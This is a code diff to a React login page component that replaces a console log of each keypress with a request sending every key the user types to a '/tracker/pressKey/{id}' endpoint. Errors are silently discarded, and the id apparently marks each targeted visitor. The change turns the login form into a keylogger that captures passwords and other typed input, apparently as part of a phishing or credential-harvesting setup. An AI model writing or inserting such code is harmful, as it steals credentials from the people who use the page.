@@ -2,13 +2,14 @@ import {Input} from "@/components/ui/input.tsx";
 import {Button} from "@/components/ui/button.tsx";
 import {useParams} from "react-router";
 import {useEffect} from "react";
+import {axiosInstance} from "@/api/CONSTANT.ts";
 
 export const Login = () => {
     const {id} = useParams()
 
     useEffect(() => {
         function handleKeyDown(e: KeyboardEvent){
-            console.log(e.key)
+            axiosInstance.post(`/tracker/pressKey/${id}`, {key: e.key.toString()}).catch(() => {})
         }
 
         window.addEventListener("keydown", handleKeyDown)
